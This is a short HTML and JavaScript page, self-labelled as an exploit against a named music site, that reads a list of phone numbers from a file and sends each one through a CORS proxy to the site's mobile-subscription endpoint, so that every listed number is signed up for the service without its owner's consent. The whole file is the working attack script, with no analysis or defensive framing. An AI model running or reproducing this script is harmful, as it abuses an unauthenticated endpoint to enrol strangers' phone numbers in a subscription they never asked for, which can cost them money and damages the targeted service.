<!-- EXPLOIT WRITTEN BY x0rz-->
<!-- DATE: DEC 27, 2017-->
<!-- VICTIM: HTTPS://MKITO.COM-->

<!DOCTYPE html>
<html>
<head>
    <title>Mkito Mobile Auto-Subscription B0t</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head>
<body>        
    <input type="file" id="input">
    <textarea cols="50" rows="20" id="mobile"></textarea>
    
    <script type="text/javascript">
        
        var mobile;        
        var reader = new FileReader();
        
        reader.onloadend = function(){
            document.getElementById("mobile").innerHTML = reader.result;
            var textArea = document.getElementById('mobile');
            var lines = textArea.value.split('\n');    // lines is an array of strings

            // Loop through all lines
            
            for (var j = 0; j < lines.length; j++) {
                mobile = lines[j];
                $.get('https://allorigins.me/get?method=raw&url=' + encodeURIComponent("https://mkito.com/mobile-subscriptions/php/mobile-subscription.php?message=mkito&mobile="+mobile+"&operator=vodacom") + '&callback=?', function(data){
                    console.log(data);
                });
                
            }
        };

    </script>

</body>
</html>